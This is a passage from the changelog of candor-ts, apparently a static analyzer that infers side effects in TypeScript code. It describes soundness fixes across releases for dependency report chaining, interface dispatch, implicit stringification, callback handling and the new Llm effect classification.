newly carry `invisible`/`Unknown` where a dependency's report is incomplete; regenerate baselines.

⚠ **⟨0.20⟩ A chained dependency's masked Net surface no longer arrives certified** (`scan.mjs`). `hosts` is
a LOWER bound and `netClass`'s `unknown-host` is the producer's published judgment that it is one; the join
copied the literals and not the judgment. A dep entry reading `netClass: ['known-telemetry','unknown-host']`
arrived at the consumer as `['known-telemetry']`, and `deny Net[unknown-host]` — a rule whose entire job is
to catch a destination candor cannot see — went exit 1 → exit 0 one package boundary along, against a
single-tree control that is exit 1 in both arms. The same hole let a literal host in the CONSUMER's own body
certify a chained dep's hostless Net (candor-java `e24edd9`'s masking shape, one boundary along). A
fail-closed marker failing open at the boundary, the sibling of `e66f29e`; no format rung, since the
dependency already published the answer under the hash the consumer joins. ⚠ `deny Net[unknown-host]` may
newly fire on a chained consumer.

⚠ **⟨0.19⟩ A chained dependency's Unknown keeps its REASON CLASS at the consumer** (`scan.mjs`). The dep
join copied `inferred` and `invisible` only, so a dependency's `Unknown[reflect:eval]` arrived as a bare
`Unknown` and fell back to the generic `unresolved` — and `deny Net Unknown[reflect]`, a rule written to
bite exactly that hole, stopped biting one package boundary away. The ts sibling of candor-java `6ab26e4`,
and the root cause was the same **duplication**: the CallExpression arm and the desugared-declaration arm
each spelled the apply-a-dep-entry copy out, drifted, and the reason class was added to neither. There is
one `applyDepHit` now. A report failing the §2.1 version check keeps the bare `Unknown`: its reasons are
assertions from a build we do not trust, and `unresolved` is the honest class for "we cannot say why".

Measured, chained over four `@ukri-tfs` services against five workspace packages: **0 effect gains, 0
losses, entry counts identical, and 606 functions gain a real reason class** where they read `unresolved`
(`callback:value.trim` ×570, `dispatch:…` the rest). Producer reports byte-identical — this is
consumer-side only. ⚠ a narrowed `deny E Unknown[<class>]` rule may newly fire on a chained consumer; that
is the rule finally seeing what it was written for. Five tests, the second fixture (a rule naming a
*different* class must still pass, so "the class travels" has not become "every narrowed rule matches")
written to pin the direction; both guards mutated out with their named failing tests.

⚠ **A union entry carrying `Unknown` now carries the trust marker too** (`scan.mjs`). `unresolved` was set
on the `broad` arm only, so an `interfaceUnion` entry that *inherited* `Unknown` from an implementer's body
published `inferred: ['Unknown']` with `unresolved` absent — telling a machine consumer in one field that
the set may be incomplete (SPEC §2: "true if `inferred` may be incomplete") and in the next that it is not.
Live on real code: every one of the seven unions `rxjs` published had it. The marker now follows the set,
exactly as it does for an ordinary entry; the *reason* stays scoped to `broad`, correctly, since ⟨0.6⟩
requires `unknownWhy` on a **direct** `Unknown` source and an inherited one is not that. Found while tracing
the entries a truncated census drops.

⚠ **A real entry claiming a union's hash no longer suppresses the union** (`scan.mjs`). The interface-CHA
emitter skipped any hash already published by a real entry, where candor-java **merges** it (`48a5f18`).
That commit's argument transfers whole: publishing under a hash is answering *what can running this member
do*, so `['Fs']` under a hash a consumer keys on is a purity claim about everything else the dispatch
reaches. TypeScript reaches the collision by a **bare name** — the hash is `pkg#Store.save`, so any
`class Store` in the package claims the key an interface-typed consumer forms, whether through declaration
merging (`interface Store` + `class Store` are one name) or through two unrelated declarations sharing a
name across files. Measured on the second shape: in-scan, `go(s: Store) { s.save() }` reads `['Fs','Net']`
and `deny Net` exits 1; split and chained, the consumer read the unrelated class's `['Env']` — a dropped
`Fs` *and* `Net` with `deny Net` at exit 0, plus a fabricated `deny Env` catch. The engine contradicting
itself across the scan boundary.

**Where this departs from java, and why it is not `mergeUnionInto`.** java widens the claiming entry in
place; it can, because there the claimant is the interface's own `default` **method**, a body whose in-scan
dispatch site is already charged the whole CHA union. TypeScript interfaces have no bodies, so the claimant
is always a **class** body — and widening it charges that class with effects a *different* class performs.
Measured with java's merge ported literally: `src.other.Store.save`, whose body only reads an environment
variable, comes back `['Env','Fs','Net']` and the producer's own `deny Net` names it as a violator. That is
precisely the hazard java's own comment names when it refuses to widen `declared`/`overdeclared`, one field
along. So the union is emitted as its **own** marked entry under the shared hash and SPEC §2's documented
duplicate-hash **UNION** rule does the join at the consumer: the same answer java's merge produces, with no
analysed unit's assertions rewritten and no `analyzed` arithmetic disturbed. java's "return `real`
unchanged when the union adds nothing" survives as a dedup, so reports stay byte-identical wherever there
is nothing to add; a `broad` union always publishes, because its `unresolved`/`unknownWhy` is a disclosure
about the *dispatch* that a resolved class entry does not make.

⚠ **A truncated typings census refuses to PUBLISH, not to look** (`scan.mjs`). The published-typings walk
gives up past 128 declaration files, and it discarded the typings arm when it did — landing the refusal on
the *evidence* side, when the evidence is the only thing that can tell the engine an interface name means
two different things. The comment beside the cap argued over-matching is safe because "an extra declaration
can only make a name ambiguous (refused)": true of the files the walk collects, false of the arm it throws
away whole. For a package whose `.d.ts` tree is big enough, the ambiguity counter read 1 instead of 2, the
never-guess guard did not fire, and the package published its **internal** `Store` (implementer does `Net`)
as the answer for the **public** one (implementer writes to disk) — `pkg#Store.save -> ['Net']` with
`unresolved: false`. A consumer then inherited a fabricated `Net` (`deny Net` catching a dispatch that
cannot reach the network) and a dropped `Fs` (`deny Fs` green at exit 0 on one that does): the exact defect
`d7060ca` measured and closed, restored for precisely the packages big enough to hit the cap.

Now a truncated census makes **every** name refuse, routed through the never-guess guard the emitter already
has — two declarations of a name, and a census that cannot prove there is only one, are the same evidential
position. Half 1's unanswerable-key arm is the floor under it at the consumer, so refusing costs disclosure
rather than honesty. A census that *completes*, however large, publishes exactly what it did before.

Measured. The cap bites **3 packages in 3 213** across eight real `node_modules` trees (88 of them declare a
wildcard typings pattern at all): `rxjs` twice and `@angular/common`. `@angular/common` published no unions
either way; `rxjs` loses **7, every one of them a bare `['Unknown']`** — no concrete effect is lost anywhere,
and a consumer dispatching on `rxjs.Observer.next` comes out *better*, `Unknown[dispatch:rxjs.Observer.next]`
where it previously read `Unknown[unresolved]` (the union's reason class does not survive the dep join —
still open). Seventeen other published packages and seven workspace producers carrying 13 union entries:
**byte-identical**. Six regression tests, the second fixture (a big-but-complete census must still publish)
written first, and the guard mutated out with its four named failing tests recorded.

**Build id moved to 0.23.2, and an untrusted chained report no longer licenses silence** (`scan.mjs`,
`package.json`). The per-file module unit key landed without a version bump, so a build with the *new* key
shape and a build with the *old* one both called themselves `candor-ts-0.23.1` and §2.1 could not tell them
apart. Two separate things follow, and only the second is a code fix:

- The **build id must move with any wire-visible key change**, because §2.1 staleness is the only thing that
  reads it. Not moving it disarms every protection that *does* work — ordinary call joins stop downgrading
  to `Unknown`, and the AS-EFF-005 baseline guard stops invalidating.
- It would **not** have closed the hole it looked like it closed, and the code comment claiming it did is
  corrected rather than trusted. Staleness rewrites the *content* of the keys a report carries; it can never
  conjure a key the report lacks, so an already-installed consumer whose only lookup is `<pkg>#<module>`
  misses whatever the version says. Measured with the pre-change build as the consumer over a report from
  this one: the importer is **absent from `functions`** — a ⟨0.21⟩ purity claim — and `deny Fs` sits at exit
  0, where the single-tree control is exit 1 in both arms. Nothing a new report can carry fixes that either:
  the old consumer's code is frozen and reads exactly one discriminator.

What *is* fixable is the same hole in this build, for the next key change. ⚠ **A chained report that fails
the §2.1 version check now grants no coverage.** Previously it was registered as covering its package
anyway, so the keys it carried read `Unknown` (right) while every key it simply did not contain read **pure**
(wrong, and silent) — a purity claim on the authority of a report the engine had just decided not to trust.
Now an unanswered key falls back to the κ ledger's `invisible: [pkg]` hedge, and an `import` backed only by
such a report discloses `Unknown` with `stale-dep:<pkg>` instead of nothing. Fires only on a version
mismatch — a configuration the family already treats as invalid gate input.

Also: `depInitCell` tries the **precise** per-file key before the legacy `<pkg>#<module>` one. The legacy
branch ran first and won unconditionally, so a report carrying both shapes was answered by the union the
per-file key exists to replace.

Measured. Nine real chained reports across five `@ukri-tfs` packages and four services, 2 587 entries, both
arms' engines kept by content hash: **byte-identical** once the version string is normalised — the predicted
result, since none of those runs has a version mismatch. The mechanism was then shown live on the same
corpus rather than assumed reachable (standing bar item 8): with one dependency report marked as another
build, `invite-service` gains **76 `invisible` hedges and 10 functions that were absent from the report
entirely**, with 0 effect losses. Eight regression tests, each guard mutated out and its named failing test
recorded.

⚠ **A chained lookup that could never have been answered no longer reads as a purity claim** (`scan.mjs`).
candor-spec `DEP-RECEIVER-TYPING-DESIGN.md`, half 1; conformance PART 21 now runs the ts arm alongside
java and rust. When a call into a chained dependency finds no entry, that means one of two things, and the
engine drew no distinction between them:

- **keyed-and-missed** — the key names a body the dependency scanned (`declare class C { m() }`,
  `declare function f()`). Dependency reports omit pure functions (SPEC §2 rule 3), so absence IS the
  dependency's answer. Unchanged: silence stays silence.
- **no answerable key** — resolution landed on an *abstraction*: an interface method or property
  signature, an anonymous type-literal member, an `abstract` member. No body is hashed under that name in
  the dependency, whatever its implementations do, so the lookup was never a question. Now `Unknown` with
  `dispatch:<pkg>.<Owner>.<member>`; previously the caller was **absent from the report entirely**, which
  under the ⟨0.21⟩ manifest is a positive purity claim rather than a gap.

TypeScript arrives at this by a different road than rust, and the canonical fixture from the design note
does **not** reproduce here: return types travel in the `.d.ts`, so a factory-bound receiver is typed and
`build().fetch()` joins precisely. A receiver TS genuinely cannot type is `any`, which already read
`callback:` Unknown. What was silent is the receiver typed to an abstraction the dependency's report has
no vocabulary for — `build(): Fetcher` over a `.d.ts` whose only body is hashed `pkg#Client.fetch`.

The trigger is a **conjunction of three**, not "untyped receiver" (which is pervasive, and hedging on it
would be the false-uncertainty failure): the key is unanswerable, the value comes from a package, **and
the package is CHAINED**. The third is load-bearing — for an unchained package the κ ledger already
discloses `invisible: [pkg]`, so a second voice would be noise; it is precisely when the package is
covered that the ledger correctly falls silent and that silence becomes the confident claim.

Measured. Unchained, 10 real targets (candor-ts, 5 ukri-tfs packages, 4 services): **0 gains, 0 losses,
entry counts identical** — the third conjunct holding on real code. Chained (`--workspace`) over 5
ukri-tfs services: **5 gains, 0 losses** across ~1000 analysed functions. Chaining the same dependency
reports *without* producer-side `interfaceUnion` entries (the plain `CANDOR_DEPS` shape): 8 gains on 202
analysed functions, and 3 on 453. Every gain traced — `@ukri-tfs/message-handling#OutboundChannel.publishRaw`
(implementations publish to SNS; that package declares the interface name twice, so the union's
never-guess ambiguity guard correctly declines and this arm is the fail-closed floor underneath it),
`@ukri-tfs/common#CoreLogger.info`/`.error` (implementations reach `Clock`), `ServiceHostNames.getUrl`
(reaches `Env`), and `FastifyInstanceDecorations.getServices` (installed at runtime by
`fastify.decorate('getServices', …)` — genuinely unresolvable). ⚠ may add `Unknown` to functions
previously reported pure when a dependency report is chained.

⚠ **Four mechanisms that died at the SCAN BOUNDARY** (`scan.mjs`). Take code candor analyses soundly,
split it across a package boundary, scan the dependency separately and chain its report — the arrangement
candor's own docs recommend — and the effect disappeared. The dependency's report held the right answer
under the right key and nothing looked for it. Recorded four-way in candor-spec
`SOUNDNESS-VEIN-crossing-the-scan-boundary.md`; this closes the four ts mechanisms. Three of them were
**gate-level, not report-level** — `deny Fs` went exit 1 (correct) → exit 0 (a false all-clear) on
identical source, and is back to exit 1.

- **Implicit coercion into a dependency.** `` `${e}` `` / `String(e)` / `JSON.stringify(e)` / `arr.join()`
  where `e`'s `toString`/`toJSON` lives in a chained dep emitted *nothing* — no effect, no `Unknown`, no
  `invisible`. `coercionTargets` collected LOCAL members only, and the design note there argued the κ
  ledger covered the rest; measured, it does not, because a coercion is not a CallExpression and the
  ledger lives in the CallExpression handler.
- **`new DepClass()`.** Every scan mints a `Class.constructor` unit (field initializers run at
  construction), so the dep's report carries `<pkg>#<Class>.constructor` — but the join keys on
  `decl.name`, and a constructor declaration has none, so the lookup was skipped; the implicit-ctor arm
  never consulted the chain at all.
- **A dep function passed BY REFERENCE to an invoking HOF** (`xs.forEach(depWrite)`,
  `setTimeout(depWrite, 0)`). Neither an edge nor an `Unknown`: the opaque-callback guard excluded it
  because "dep calls flow through the κ/invisible channel" — a channel a by-reference pass never enters.
- **The MONOREPO shape.** A symlinked workspace dep produced **no disclosure at all** — no `invisible`,
  no `coverage.uncovered`, no stderr advisory — because every disclosure arm was gated on a
  `node_modules/` path segment, which a symlink's REAL path does not have. The published-package shape of
  the same code disclosed correctly, so in a monorepo every cross-package reach read confidently pure
  until someone remembered `--workspace`. Pure disclosure fix; no effect attributed, no verdict moved.

Following the rust template (`candor-rust 1623a07`), none of these adds a resolution path: each routes
its declaration through the decision procedure the call path already runs — chained sibling report (SPEC
§2 `hash` join), then the §5.1 manifest, then the κ-coverage ledger.

No fabrication. A/B over 13 real targets (candor-ts, 8 published npm packages, 4 ukri-tfs monorepo
packages/services), unchained: **0 effect gains, 0 effect losses**, 166 `invisible` gains (all in the
three monorepo targets, each naming a real symlinked sibling). CHAINED (`--workspace`) over 4 ukri-tfs
services: **7 effect gains, 0 losses**, every one traced to
`@ukri-tfs/common#ServiceHostNamesFromAwsServiceDiscovery.constructor → ['Clock','Env']` reaching
`createServiceHostNamesForDsApi`. The coercion arm is entered a few hundred times across the corpus and
correctly contributes nothing every time (ES-lib / `@types/node` terminals) — the anti-flood property
holding under load rather than an unexercised path. ⚠ may add effects/`invisible` to functions previously
reported pure when a dependency report is chained.

⚠ **Implicit STRINGIFICATION reached through dispatch or a formatting sink is no longer read silently
pure** (`scan.mjs`, the coercion-desugaring arm). Closes the four-way common-mode vein recorded in
candor-spec `SOUNDNESS-VEIN-implicit-stringify.md` — found on HikariCP by the dynamic syscall oracle
(`ConcurrentBag.remove` inferred `[Log]`, observed `[Clock]`) and reproduced in all four engines.

The engine already desugared the JS coercion protocol (`` `${x}` `` / `"s" + x` / `String(x)` /
`JSON.stringify(x)` → the operand's `toString`/`valueOf`/`toJSON`/`[Symbol.toPrimitive]`), but resolved
the member on the operand's **declared** type only. Two shapes stayed silent:

- **Dispatch.** An INTERFACE- or BASE-CLASS-typed operand whose type declares no `toString` resolved to
  the pure lib.es `Object.prototype.toString` and edged nowhere — even when the only local implementor's
  `toString` performs I/O. Now CHA-dispatched over the type's local implementors/subclasses, reusing the
  `interfaceImpls` index ordinary dispatch already uses plus a new `classDescendants` sibling of
  `classOverrides`. No `Unknown` fallback and no ≤12 family bound are needed here (unlike ordinary
  dispatch): the coercion protocol has a **known-pure terminal**, so "no local member" is a genuine pure
  resolution rather than a dropped target — which is what keeps this from turning every template literal
  in every program into an `Unknown`.
- **Sinks.** The stringification happening INSIDE a library, with no coercion node at the call site:
  `console.*` with an object argument, a logging level-method on an external logger
  (`logger.warn("%s", e)` — the direct analogue of the SLF4J parameterized call the vein was found on),
  and `Array.prototype.join`/`toString` plus array elements under
  `` `${arr}` ``/`String(arr)`/`JSON.stringify(arr)`, which coerce every element.

No fabrication: the mechanism edges only where the operand's type genuinely declares a LOCAL
`toString`/`valueOf`/`toJSON`, so string/number/plain-object/library-typed operands contribute nothing.
A/B over ~17,000 analyzed functions in 8 real repos (ukri-tfs 9,178 · nest · typeorm · zod · graphql-js ·
ts-node · winston · pino): **0 changed effect sets, 1 new call-graph edge**
(`printSchema.printUnion → GraphQLObjectType.toString`, a genuine `types.join(' | ')` over an object
array; the target is pure, so no effect moved). Scan time unchanged.

Residual, disclosed: `JSON.stringify` is not recursed through named object PROPERTIES
(`JSON.stringify({ wrapped: e })` does not reach `e.toJSON`) — only array elements. Recursing arbitrary
object graphs is where flood risk lives, so the precise subset shipped instead.

## [0.23.1] — 2026-07-20

**Performance — the pass-3 least-fixpoint is no longer O(V²) on deep call graphs (no output change).**
Both fixpoint sweeps (effects + the literal surfaces) used `while (changed) { for [,rec] of fns }`, which
re-swept every function on every pass, so the pass count equalled the longest back-to-front call chain —
O(V²) on deep whole-project graphs (a 6000-deep chain took ~8.9s). Replaced with a worklist over a shared
callee→callers reverse index: a function is reprocessed only when a callee actually gained an effect. Same
monotone set-union (confluent) least fixpoint → order-independent → **report byte-for-byte identical**
(verified via `--json` across a 6000-deep chain (1.6 MB report) and a depth-30 layered project; `npm test`
green). ~1.4× on the deep chain, ~1.05× on realistic-depth projects; trivial graphs unaffected. Mirrors the
worklist fix in the Java engine (both are whole-project analyzers).

⚠ **Sync callback-invoker: an OPAQUE callback handed to a synchronous HOF (`forEach`/`map`/`filter`/`some`/
`every`/`find`/`flatMap`/`reduce`/…) is no longer read silently pure** (`scan.mjs`, the `HOF_INVOKERS` arm).
`arr.forEach(cb)` where `cb` is a parameter (or any callable the checker can't resolve to a body) is INVOKED
by the HOF — but the es-lib signature resolved the CALLEE, so the callback reference was dropped ⇒ the function
read PURE though it runs caller-supplied code (the cardinal sin; the direct `cb()` form was already `Unknown`).
It now discloses `Unknown` (`callback:<cb>`), matching the direct-call posture. This is the **TS arm of a four-way
sync-callback-invoker parity fix** (candor-java shipped it as `c755acd`, `Rules.SYNC_CALLBACK_INVOKERS`).
**OPAQUE-ONLY guards** keep over-disclosure at the floor — an INLINE arrow (`arr.forEach(x => …)`, the
overwhelming majority) keeps its lexically-analyzed effect; a RESOLVABLE named/local callback keeps its resolved
effect; a PURE global builtin (`.filter(Boolean)`, `.map(String)`) stays pure; and only the callback POSITION
(arg 0) is considered, so `reduce(cb, initialValue)`'s seed is never mistaken for the callback. A/B on real code
(fp-ts) added `Unknown` to 10 genuine opaque-callback sites with **zero** concrete-effect fabrication and **zero**
lost effects; zod/p-map/ky/p-queue showed zero delta (all inline-arrow / pure-global). ⚠ may add `Unknown` to a
function previously reported pure.

## [0.23.0] — 2026-07-20

Spec floor → **0.23**. Soundness-increasing, report-shape-neutral:
- **cross-package interface dispatch** (interfaceUnion, the 0.23 rung): a chained consumer's interface
  method resolves to the impl's effect across packages (gated behind `CANDOR_WORKSPACE_CHAIN`). PART 18.
- **⚠ opaque callback → synchronous invoker** (`arr.forEach(cb)`/`map`/`filter`/… with an opaque callback
  the checker cannot pin to a body) discloses `Unknown` — the four-way sync-callback rung (PART 1
  `sync_callback_opaque`). Inline arrows and resolvable callbacks keep their analyzed effect (no flood).

## [0.22.0] — 2026-07-18

Spec floor → **0.22** (the `verify` oracle rung; report/verdict schema unchanged from 0.21). candor-ts folds in
the **effect-polymorphism fix** (`scan.mjs` pass 2c): `process.env` aliased through a parameter into a helper that
writes it — e.g. dotenv's `populate(processEnv){ processEnv[k]=v }`, called by `config` with
`let processEnv = process.env` — is no longer read silently pure. Reconciled along the callgraph: a **must**-alias
argument into a written parameter yields `Env`; a reassignable **may**-alias yields `Unknown` (disclosed, never
fabricated). Scoped to `process.env`; a corpus census showed the two conditions coincide on ~1 leaf per 806
functions, so the benign argument-mutating majority is untouched. Found on the public corpus (dotenv). ⚠ may add
`Env`/`Unknown` to a function previously reported pure.

⚠ **`candor verify` now attributes effects TRANSITIVELY — the oracle falsifies candor's core (transitive) claim,
not only leaf classifications.** candor's report is transitive (a function that *reaches* an effect is effectful),
but the runtime capture (`verify-emit.mjs`) attributed each observed effect only to the **nearest** project frame
(the leaf). It was therefore structurally blind to a transitive cardinal sin: a CALLER that reaches an effect
through a dropped/dynamic edge and is reported `pure` was never tested (the effect landed on the leaf; the caller's
observed set was empty ⇒ H held vacuously). `emit` now records the effect at **every** project frame on the stack
(`projectSites()`), and the downstream span-attribution (`verify-core` `attribute`) maps each frame's call-site line
to the function enclosing it — so a caller-level miss is caught (`t.middle: ran {Fs} declared {pure}`). A distinct
`(site,effect)` is written once (global set), bounding the trace. This brings the Node arm to the candor-java
`-javaagent` oracle's transitive attribution. Regression-gated by three new `verify:` transitive checks in `test.mjs`
(report-is-transitive, caller-chain-witnessed-holds, transitive-caller-miss-violates). Verify-only; report/verdict
bytes unchanged.

## [0.19.0] — 2026-07-17

Reason-scoped `Unknown` policies (SPEC §6.2): `deny E Unknown[reflect,dispatch,indirect,native,unresolved,setup]`
narrows the `Unknown` part of a deny to a fixed reason-class vocabulary, with the `dynamic`/`*` aliases and
config `.candor/config` `unknown-alias <name> = <class…>` names. Bare `deny E Unknown` is unchanged
(`Unknown[*]`); an unrecognized reason maps to `unresolved`; the class propagates transitively. An AS-EFF-006
`--gate-json` verdict whose `effects` include `Unknown` carries a **`reasonClass`** array. Report bytes
unchanged. Also: the **SETUP diagnostic** — a call into a declared-but-uninstalled npm dependency is tagged
`no-node_modules:<pkg>` (reason class `setup`), and a scan-time line names the `npm install` fix; because
`Unknown[dynamic]` excludes `setup`, a strict gate bites genuine dynamism while tolerating the fixable holes.

## [0.18.0] — 2026-07-16

### spec 0.18 — the trust-trio

candor-ts now declares **spec `0.18`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`). A pinned-tool-surface
rung (no report/verdict change), closing three ways the tool could quietly mislead — all pinned four-way:

- **`--strict` advisory-verb CI gate**: `fix-gate`, `gains`, `unverified` are advisory (exit 0); `--strict`
  makes each a CI gate (exit 1 while a finding remains). `gains` rejects a swallowed `--policy` (exit 2),
  naming the scan-time `deny <E> gained` gate (`AS-EFF-005`).
- **mostly-Unknown disclosure**: the scan opener + `tour` never say "nothing hidden" over a ≥⅓-Unknown graph;
  `tour --json` carries an additive `unknown: {count, total}`.
- Hardening from a Fable-model code review (the earlier round already rejected single-dash typos + tolerated
  `--text` via the shared grammar).

## [0.16.0] — 2026-07-16

### spec 0.17 — the callgraph-aware baseline guard, with an Unknown-only advisory

candor-ts now declares **spec `0.16`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`; the report
envelope + `--gate-json` verdict carry it). A consumer pinning `spec == "0.15"` must accept `0.16`.
Report bytes for a covered project are otherwise unchanged; the change is in the baseline ratchet, not
the analysis.

### ✨ Callgraph-aware baseline guard ⟨0.16⟩ — pure→effectful is caught

The AS-EFF-005 baseline ratchet in `scan.mjs` now keys function *existence* on the baseline
`.callgraph.json` sidecar (the same node-set `origin` uses), not on the report's effect table — which
OMITS pure functions. A function that was pure in the baseline and is now effectful is therefore a
genuine gain and fires the ratchet (exit 1), where before it slipped through as "not in the baseline".
The sidecar loader is a stricter inlined one than `gains`' tolerant reader: an absent sidecar
degrades to report-only with a note; a **corrupt** sidecar exits 2, so a broken sidecar can never
silently narrow the guard.

### Unknown-only gains are advisory, not a regression

Corpus testing on real dependency bumps showed the guard firing on gained `Unknown` alone —
resolution noise, not a capability gain. `Unknown` is the §4 trust marker (pure policies exclude it),
so failing CI on a pure→Unknown transition breaks innocuous bumps. Now the ratchet (exit 1) fires
only on gaining a **real** boundary effect; an `Unknown`-only gain is disclosed as one advisory note
with the exit unchanged. A real+Unknown gain still fails, and the shown effects are the real set with
`Unknown` filtered out. Pinned by conformance PART 15b/15c.

## [0.15.0] — 2026-07-15

### spec 0.15 — the coverage envelope, plus host-resolution and Env recall

candor-ts now declares **spec `0.15`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`; the envelope +
`--gate-json` verdict carry it). **⚠ report bytes change** — a consumer pinning `spec == "0.14"` must
accept `0.15`; a report over a project with uncovered dependencies gains the `coverage` envelope
field, and code reaching a const-anchored / literal-head host or an indirect `process.env` read gains
effects (`Llm`/`Db`/`Env`) it did not carry at 0.14 (regenerate baselines). A fully-covered report
stays **byte-identical** to a 0.14 one, so the rung is wire-compatible for covered projects.

### ✨ The coverage envelope ⟨0.15⟩ — the κ ledger travels with the report

What the scan could **not** see is now disclosed *in* the report, not only on stderr: the new §2
`coverage` envelope field carries the uncovered-dependency ledger (omitted when empty — a covered
report is byte-identical). The `--gate-json` verdict gains a **verdict-preserving** `coverage`
advisory (key order pinned `[spec, ok, violations, coverage]` — it informs, never flips `ok`), and
`gains` (the CLI verb and the MCP `candor_gains` tool, via one shared code path) re-discloses the
current ledger plus a `coverageDelta` — `{ nowUncovered, noLongerUncovered }`, names-only — so a
version-pair comparison says what went dark and what came back. Both pre-existing per-function
postures are untouched: resolvable-but-uncovered stays invisible, unresolvable stays `Unknown`.
Pinned by conformance PART 4s.

### Host-resolution recall — const-string and literal-head hosts now refine

Two common URL shapes that read as bare `Net` now resolve their host and fire the §1 `Llm`/`Db`/`Net`
refinement exactly like an inline literal:

- **Const-string resolution** (PART 4q): `const API_BASE = "https://api.openai.com/v1";`
  `` fetch(`${API_BASE}/x`) `` — a const-anchored ref, template head, or const-left concat resolves via
  the checker only when the symbol's *every* declaration is a const string literal.
- **Literal-head extraction** (PART 4r): `` fetch(`https://api.openai.com/v1/${p}`) `` — a template or
  concat whose literal head completes the authority, with interpolation only in the path, extracts
  the host.

The boundaries are sound, no fabrication: a split authority, whole-host interpolation, interpolated
port, `let`/`var`, or runtime value stays bare `Net`; a literal-head non-model CDN stays `Net`.

### Env recall fix — indirect `process.env` reads no longer read silent-pure

`Env` was classified only for a direct `process.env.KEY` dot access; bracket access
(`process.env["K"]`), a local const-alias (`const env = process.env; env.K`), destructuring
(`const { K } = process.env`), and the `in` operator (`"K" in process.env`) all read **silent-pure**
— a silent `Env` under-report on common config idioms, found via **real-world corpus testing**
(chalk / supports-color, which reported 0 `Env`). Symbol-based alias tracking (cleared on
reassignment), with `import process from 'node:process'` treated as the process global. No
fabrication: a non-env object, function param, or reassigned local stays pure.

## [0.14.1] — 2026-07-14

Patch — a soundness/precision fix, still spec `0.14` (reports gain no new field; two unit shapes change).

- **Static initializer block → its own `<static-init>` unit.** A `class C { static { … } }` block runs at
  class-DEFINITION time, not instance construction, but its effects were folded into the instance
  `C.constructor` unit (and carried no `unitKind`). It now mints its own `C.<static-init>` unit with
  `unitKind:"initializer"` — separated from the ctor, so `new C()` no longer appears to perform the
  static block's effects. (Found probing adjacent cases after the 0.14 top-level rung.)

## [0.14.0] — 2026-07-14

### spec 0.14 — the top-level `<module>` initializer unit

candor-ts now declares **spec `0.14`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`; the envelope +
`--gate-json` verdict carry it). **⚠ report bytes change** — a consumer pinning `spec == "0.13"` must
accept `0.14`, and a module whose top-level executable code performed an effect **was previously
DROPPED as an empty, false-"pure" report**; it now emits a synthesized `<module>` unit (regenerate
baselines; a scan over such a file gains a unit and its effects it did not carry at 0.13). The headline
below is the reason to upgrade.

### ✨ The top-level `<module>` initializer unit — an effect that was silently dropped is now a unit

A module whose **top-level executable code** performed an effect — a top-level `await`, an IIFE, a bare
`fetch(…)` / `readFileSync(…)`, an `export const x = await …` — carried that effect **nowhere**: the
top-level statements belong to no named function, so a report over such a file came back **empty**, a
false-"pure" answer. That is the cardinal sin: a `deny Llm` / `deny Net` / `deny Fs` gate **passed** a
file that egressed at import time, because the effect had no unit to attach to.

The top-level effects are now synthesized as **one `<module>` unit per file**, carrying
`unitKind:"initializer"`, the effects performed at module scope, and the call edges out of top-level
code (so its inferred set reflects the **transitive** reach of everything the module runs on import).
The unit takes part in the gate like any other: a top-level `fetch` to a model host now fails a
`deny Llm` policy, a top-level `readFileSync` fails `deny Fs`. Found by dogfooding a real OSS LLM app
(**openai-quickstart-node**), whose model call ran at module top level and reported as pure. Conformance
**PART 4p** pins the initializer unit four-way (candor-java / -rust / -ts / -swift).

## [0.13.0] — 2026-07-14

### spec 0.13 — the `Llm` effect + the edit-time gate's self-inspection surfaces

candor-ts now declares **spec `0.13`** (`SPEC_VERSION` in `scan.mjs` + `query.mjs`; the envelope +
`--gate-json` verdict carry it). **⚠ the `spec` string changed** — a consumer pinning `spec == "0.12"`
must accept `0.13` — and, because `Llm` is a new boundary effect a scan can now emit, **a report over
model-provider code gains an effect it did not carry at 0.12** (regenerate baselines; a policy that
allow-listed `Net` for such a call may need an explicit `Llm` allow). The two headlines below are the
reason to upgrade: the `Llm` effect, and the `candor_activity` MCP tool + the candor-lsp activity push.

### ✨ The `Llm` effect — a model-provider call, surfaced as its own boundary effect

A call to a model provider is now classified **`Llm`** — a boundary effect that **refines `Net`** (the
`Db`-over-`Net` precedent): every `Llm` is a `Net`, but the finer label names *which* kind of network
egress crossed the boundary. Two recognisers feed it: a **verbatim set of known model-host literals**
(the OpenAI / Anthropic / Bedrock / Ollama-loopback / … hosts), matched against the **host actually
parsed** from the call's URL argument — never a raw string substring; and a **curated npm model-SDK
list** (`openai`, `@anthropic-ai/sdk`, `@aws-sdk/client-bedrock-runtime`, `ai`, `ollama`, `langchain`,
…) applied as a whole-module `Net` κ rule that refines to `Llm` at the classify site. `Llm` joins the
boundary / salience / CONTAINED sets and the AS-EFF-008 masked set, and `Llm` allows key off `Net`
incompleteness, so the gate treats it consistently with every other boundary effect.

A **latent global-`fetch` host-capture bug found in the same sweep is fixed**: `fetch(url)` had been
capturing **no host** (so the literal never reached the allowlist/masking path) — it now captures the
URL literal like every other network call and refines to `Llm` on a model host. The host predicate was
also tightened against fabrication: the recogniser reads the host from the documented argument position
(a trailing options literal is not the host), the Ollama `:11434` refinement is **loopback-only** (a
remote `:11434` is plain `Net`, not `Llm`), and the Bedrock match is a **first-label** check
(`bedrock-runtime` / `bedrock-agent-runtime`), never an S3-bucket substring — so `axios.post` to a URL
with `:11434` in the *path*, or an `s3://…bedrock…` bucket, no longer fabricates `Llm`.

### ✨ Self-inspecting the edit-time gate — the `candor_activity` MCP tool + the LSP activity push

An agent or a human can now ask **"what has the edit-time gate actually caught?"** without shelling out.

- **`candor_activity` (MCP)** reads `.candor/activity.jsonl` and reports the gate's ledger: edits and
  verdicts, violations bucketed by AS-EFF code, effects introduced, the largest **blast radius**, the
  **deepest propagation**, plus the most recent records — with `session` / `since` / `limit` filters.
  Field semantics mirror the candor-agents `stats` surface (both count the one pinned record shape).
  Its postures are disclosure-first: a **missing log is an EMPTY result with a wiring note** (absence is
  not corruption), corrupt lines are skipped, the log path is `--root`-confined, and the tool needs
  **no report** (usable before any scan). A companion fix in the same sweep: the `candor_diff` /
  `candor_gains` **baseline** locators now resolve through the guarded prefix path like every other
  locator (existence stays loud; `--root` confinement is relaxed for the read-only baseline arg only,
  restoring the out-of-tree prior-release comparison workflow).

- **The candor-lsp activity push** surfaces a newly **blocked** gate record **in-editor**: candor-lsp
  tails `.candor/activity.jsonl` (its one watcher) and, on a new BLOCKED record, pushes the delta the
